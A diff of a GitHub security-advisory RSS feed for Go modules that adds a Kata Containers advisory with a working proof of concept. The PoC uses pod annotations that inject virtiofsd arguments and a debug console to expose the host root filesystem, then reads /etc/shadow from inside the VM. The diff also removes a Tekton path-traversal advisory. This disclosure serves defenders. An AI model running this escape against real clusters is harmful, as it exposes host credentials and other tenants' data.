@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-26T23:22:56.643Z</updated>
+    <updated>2026-05-27T00:26:13.599Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,152 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/kata-containers/kata-containers] Kata Containers have VM Escape via virtiofsd Argument Injection through Default-Enabled Pod Annotations]]></title>
+        <id>https://github.com/advisories/GHSA-rr59-xxvx-96qr</id>
+        <link href="https://github.com/advisories/GHSA-rr59-xxvx-96qr"/>
+        <updated>2026-05-26T23:57:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Kata Containers ships with a default configuration that allows pod creators to inject arbitrary command-line arguments into the virtiofsd process through the <code>io.katacontainers.config.hypervisor.virtio_fs_extra_args</code> pod annotation. By injecting <code>-o source=/</code> along with <code>--no-announce-submounts</code> and <code>--sandbox=none</code>, an attacker can override the virtiofsd shared directory to serve the entire host root filesystem into the guest VM. Combined with the <code>kernel_params</code> annotation (also enabled by default) to activate the agent debug console, the attacker can mount the host filesystem from inside the VM and read or write any file on the host, including /etc/shadow.</p>
+<h2 id="details">Details</h2>
+<p>The default Kata configuration at configuration.toml line 1 contains:</p>
+<pre><code>enable_annotations = ["enable_iommu", "virtio_fs_extra_args", "kernel_params", "kernel_verity_params"]
+</code></pre>
+<p>Both <code>virtio_fs_extra_args</code> and <code>kernel_params</code> are enabled out of the box. The annotation name is checked against this allowlist, but the annotation value (the actual arguments) is never validated or filtered.</p>
+<p>In utils.go at line 981, the runtime parses the annotation value as a JSON string array and appends it directly to the virtiofsd arguments:</p>
+<pre><code class="language-go">if value, ok := ocispec.Annotations[vcAnnotations.VirtioFSExtraArgs]; ok {
+    var parsedValue []string
+    err := json.Unmarshal([]byte(value), &amp;parsedValue)
+    // ...
+    sbConfig.HypervisorConfig.VirtioFSExtraArgs = append(
+        sbConfig.HypervisorConfig.VirtioFSExtraArgs, parsedValue...)
+}
+</code></pre>
+<p>In virtiofsd.go at line 183-198, the runtime builds the virtiofsd command line with <code>--shared-dir=&lt;kata_managed_path&gt;</code> first, then appends the extra args:</p>
+<pre><code class="language-go">args := []string{
+    "--syslog",
+    "--cache=" + v.cache,
+    "--shared-dir=" + v.sourcePath,
+    fmt.Sprintf("--fd=%v", FdSocketNumber),
+}
+if len(v.extraArgs) != 0 {
+    args = append(args, v.extraArgs...)
+}
+</code></pre>
+<p>The virtiofsd binary (Rust, from gitlab.com/virtio-fs/virtiofsd) supports a compatibility option <code>-o source=PATH</code> that overrides the <code>--shared-dir</code> value. This is processed after clap argument parsing, in the <code>parse_compat()</code> function at main.rs:462:</p>
+<pre><code class="language-rust">["source", value] =&gt; opt.shared_dir = Some(value.to_string()),
+</code></pre>
+<p>Because <code>-o source=/</code> is appended after <code>--shared-dir=&lt;kata_path&gt;</code>, it overrides the shared directory to <code>/</code>. The virtiofsd process then serves the entire host root filesystem through the virtio-fs device.</p>
+<p>Additionally, virtiofsd's <code>--announce-submounts</code> flag (set by default) causes the guest kernel to create FUSE automounts for bind mounts within the shared directory. When the shared directory is <code>/</code>, this produces automounts that shadow the root directory listing. Injecting <code>--no-announce-submounts</code> disables this behavior and exposes the true host root directory contents through the kataShared virtiofs mount.</p>
+<p>The <code>kernel_params</code> annotation is used to inject <code>agent.debug_console agent.debug_console_vport=1026</code> into the VM kernel command line. This enables a root shell inside the VM through the kata-runtime exec command. From this shell, the attacker mounts the kataShared virtiofs filesystem and accesses host files directly.</p>
+<h2 id="rootfs-bridge-poc-artifact-not-a-real-constraint">Rootfs bridge (PoC artifact, not a real constraint)</h2>
+<p>When virtiofsd uses <code>-o source=/</code> to serve the host root, the Kata agent looks for the container rootfs at <code>/&lt;container-id&gt;/rootfs</code> relative to the virtiofs root. The PoC pre-creates this directory on the host to keep the demonstration self-contained with ctr.</p>
+<p>In a real Kubernetes attack, there are several ways to satisfy this without hostPath volumes. An initContainer that runs before the target container can create the directory. Alternatively, the attacker can set up a second pod that writes to a shared persistent volume mounted on the host. The rootfs bridge is a PoC convenience, not a limitation of the vulnerability itself.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who can create pods on a Kubernetes cluster using Kata Containers with default configuration can:</p>
+<ul>
+<li>Read any file on the host, including /etc/shadow, SSH private keys, and service credentials</li>
+<li>Write to any file on the host, enabling persistent backdoors, cron jobs, or binary replacement</li>
+<li>Access other containers' data through the host filesystem</li>
+<li>Compromise the Kubernetes control plane if it runs on the same host</li>
+</ul>
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<p>Tested on a bare metal server (AMD Ryzen 5 3600, Ubuntu 24.04, kernel 6.8.0-100-generic) with Kata Containers 3.28.0 installed from the official release tarball.</p>
+<ol>
+<li><p>Install Kata Containers 3.28.0 and configure containerd. Verify that the default configuration has virtio_fs_extra_args in enable_annotations.</p>
+</li>
+<li><p>Pull a container image:</p>
+</li>
+</ol>
+<pre><code>ctr image pull docker.io/library/alpine:latest
+</code></pre>
+<ol start="3">
+<li>Run the PoC script below, or follow the manual steps:</li>
+</ol>
+<p>Manual steps:</p>
+<p>a. Extract a container rootfs and create the rootfs bridge (replace $SB_ID with your container name):</p>
+<pre><code>SB_ID="poc-exploit"
+mkdir -p /$SB_ID/rootfs
+
+# Extract alpine rootfs from OCI image
+mkdir -p /tmp/oci-extract
+ctr image export /tmp/oci.tar docker.io/library/alpine:latest
+tar xf /tmp/oci.tar -C /tmp/oci-extract
+IDX=$(jq -r '.manifests[0].digest' /tmp/oci-extract/index.json | sed 's/sha256://')
+MFT=$(jq -r '.manifests[] | select(.platform.architecture=="amd64") | .digest' \
+    "/tmp/oci-extract/blobs/sha256/$IDX" | head -1 | sed 's/sha256://')
+LYR=$(jq -r '.layers[0].digest' "/tmp/oci-extract/blobs/sha256/$MFT" | sed 's/sha256://')
+tar xzf "/tmp/oci-extract/blobs/sha256/$LYR" -C /$SB_ID/rootfs
+
+rm -rf /tmp/oci-extract /tmp/oci.tar
+</code></pre>
+<p>b. Create a marker file on the host to prove access:</p>
+<pre><code>echo "HOST_ESCAPE_PROOF_$(date)" &gt; /root/.poc-marker
+</code></pre>
+<p>c. Start the container with the malicious annotations:</p>
+<pre><code>ctr run \
+  --runtime io.containerd.kata.v2 \
+  --annotation 'io.katacontainers.config.hypervisor.virtio_fs_extra_args=["--sandbox=none","--seccomp=none","-o","source=/","--no-announce-submounts"]' \
+  --annotation 'io.katacontainers.config.hypervisor.kernel_params=agent.debug_console agent.debug_console_vport=1026' \
+  docker.io/library/alpine:latest $SB_ID \
+  sleep 3600 &amp;
+</code></pre>
+<p>Wait 20-30 seconds for the VM to start. Verify with <code>ctr task ls</code>.</p>
+<p>d. Enter the VM through the debug console:</p>
+<pre><code>/opt/kata/bin/kata-runtime exec $SB_ID
+</code></pre>
+<p>e. Inside the VM, mount the host filesystem and read host files:</p>
+<pre><code>mkdir -p /tmp/hostfs
+mount -t virtiofs kataShared /tmp/hostfs
+cat /tmp/hostfs/etc/hostname
+cat /tmp/hostfs/root/.poc-marker
+head -3 /tmp/hostfs/etc/shadow
+cat /tmp/hostfs/etc/os-release
+ls /tmp/hostfs/opt/kata/bin/
+</code></pre>
+<p>f. Observe that /etc/hostname returns the host's hostname (not "localhost"), /etc/os-release shows the host OS (Ubuntu, not Alpine), /etc/shadow shows the host's password hashes, and /opt/kata/bin/ lists the Kata binaries installed on the host.</p>
+<ol start="4">
+<li>Clean up:</li>
+</ol>
+<pre><code>ctr task kill $SB_ID --signal SIGKILL
+ctr container rm $SB_ID
+umount /$SB_ID/rootfs
+rm -rf /$SB_ID
+</code></pre>
+<h2 id="proof-of-concept-output">Proof of concept output</h2>
+<p>Below is the output from a successful run on Kata Containers 3.28.0. The host runs Ubuntu 24.04. The container image is Alpine Linux.</p>
+<pre><code>root@7a7325d5d804:/# mkdir -p /tmp/h &amp;&amp; mount -t virtiofs kataShared /tmp/h
+root@7a7325d5d804:/# echo DIRCOUNT:$(ls /tmp/h/ | wc -l)
+DIRCOUNT:37
+root@7a7325d5d804:/# echo HOSTNAME:$(cat /tmp/h/etc/hostname)
+HOSTNAME:kata-poc
+root@7a7325d5d804:/# echo OSREL:$(head -1 /tmp/h/etc/os-release)
+OSREL:PRETTY_NAME="Ubuntu 24.04.3 LTS"
+root@7a7325d5d804:/# cat /tmp/h/root/.kata-poc-marker
+HOST_NS2_1776058192
+root@7a7325d5d804:/# echo SHADOW:$(head -1 /tmp/h/etc/shadow)
+SHADOW:root:*:17478:0:99999:7:::
+root@7a7325d5d804:/# echo BOOT:$(ls /tmp/h/boot 2&gt;/dev/null | head -3)
+BOOT:System.map-6.8.0-100-generic System.map-6.8.0-107-generic config-6.8.0-100-generic
+root@7a7325d5d804:/# echo KATA:$(ls /tmp/h/opt/kata/bin 2&gt;/dev/null | head -3)
+KATA:cloud-hypervisor containerd-shim-kata-v2 firecracker
+</code></pre>
+<p>The host's real hostname (kata-poc), OS (Ubuntu 24.04.3 LTS), /etc/shadow content, kernel files in /boot, and Kata binaries in /opt/kata/bin are all visible from inside the VM. The container itself runs Alpine, confirming this is the host filesystem and not the container's own filesystem.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kata-containers/kata-containers/security/advisories/GHSA-rr59-xxvx-96qr">https://github.com/kata-containers/kata-containers/security/advisories/GHSA-rr59-xxvx-96qr</a></li>
+<li><a href="https://github.com/kata-containers/kata-containers/commit/ffa59ce3aa7877d067c9a372df0c329a23a01744">https://github.com/kata-containers/kata-containers/commit/ffa59ce3aa7877d067c9a372df0c329a23a01744</a></li>
+<li><a href="https://github.com/advisories/GHSA-rr59-xxvx-96qr">https://github.com/advisories/GHSA-rr59-xxvx-96qr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rr59-xxvx-96qr</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-26T23:57:58.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/nezhahq/nezha] Nezha Monitoring: Nezha WebSocket server stream discloses cross-tenant server telemetry to authenticated members]]></title>
         <id>https://github.com/advisories/GHSA-hvv7-hfrh-7gxj</id>
@@ -1908,70 +2054,6 @@ if int64(len(body)) &gt; maxBytes {
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-21T20:27:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines: VolumeMount path restriction bypass via missing filepath.Clean in /tekton/ check]]></title>
-        <id>https://github.com/advisories/GHSA-rx35-6rhx-7858</id>
-        <link href="https://github.com/advisories/GHSA-rx35-6rhx-7858"/>
-        <updated>2026-05-22T15:40:42.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A validation bypass in the VolumeMount path restriction allows mounting
-volumes under restricted <code>/tekton/</code> internal paths by using <code>..</code> path
-traversal components. The restriction check uses <code>strings.HasPrefix</code>
-without <code>filepath.Clean</code>, so a path like <code>/tekton/home/../results</code>
-passes validation but resolves to <code>/tekton/results</code> at runtime.</p>
-<h3 id="details">Details</h3>
-<p>Tekton Pipelines restricts VolumeMount paths under <code>/tekton/</code> (except
-<code>/tekton/home</code>) to prevent users from interfering with internal
-execution state. The validation at
-<code>pkg/apis/pipeline/v1/container_validation.go</code> checks mount paths using
-<code>strings.HasPrefix</code> without normalizing the path first:</p>
-<pre><code class="language-go">if strings.HasPrefix(vm.MountPath, "/tekton/") &amp;&amp;
-    !strings.HasPrefix(vm.MountPath, "/tekton/home") {
-    // reject
-}
-</code></pre>
-<p>Because <code>/tekton/home</code> is an allowed prefix, a path like
-<code>/tekton/home/../results</code> passes both checks. At runtime, the container
-runtime resolves <code>..</code> and the actual mount point becomes
-<code>/tekton/results</code>.</p>
-<p>The same pattern exists in <code>pkg/apis/pipeline/v1beta1/task_validation.go</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>An authenticated user with Task or TaskRun creation permissions can
-mount volumes over internal Tekton paths, potentially:</p>
-<ul>
-<li>Writing fake task results that downstream pipelines trust</li>
-<li>Reading or modifying step scripts before execution</li>
-<li>Interfering with entrypoint coordination state</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p><em>(to be filled: fixed in versions X.Y.Z)</em></p>
-<h3 id="workarounds">Workarounds</h3>
-<ul>
-<li>Use admission controllers (OPA/Gatekeeper, Kyverno) to validate that
-VolumeMount paths do not contain <code>..</code> components.</li>
-<li>In multi-tenant setups, restrict who can create Task and TaskRun
-resources via RBAC.</li>
-</ul>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>All versions through <strong>v1.10.0</strong> (both <code>v1</code> and <code>v1beta1</code> APIs).</p>
-<h3 id="acknowledgments">Acknowledgments</h3>
-<p>This vulnerability was reported by @kodareef5.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-rx35-6rhx-7858">https://github.com/tektoncd/pipeline/security/advisories/GHSA-rx35-6rhx-7858</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40923">https://nvd.nist.gov/vuln/detail/CVE-2026-40923</a></li>
-<li><a href="https://github.com/advisories/GHSA-rx35-6rhx-7858">https://github.com/advisories/GHSA-rx35-6rhx-7858</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rx35-6rhx-7858</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-21T20:26:41.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines: VolumeMount path restriction bypass via missing filepath.Clean in /tekton/ check]]></title>
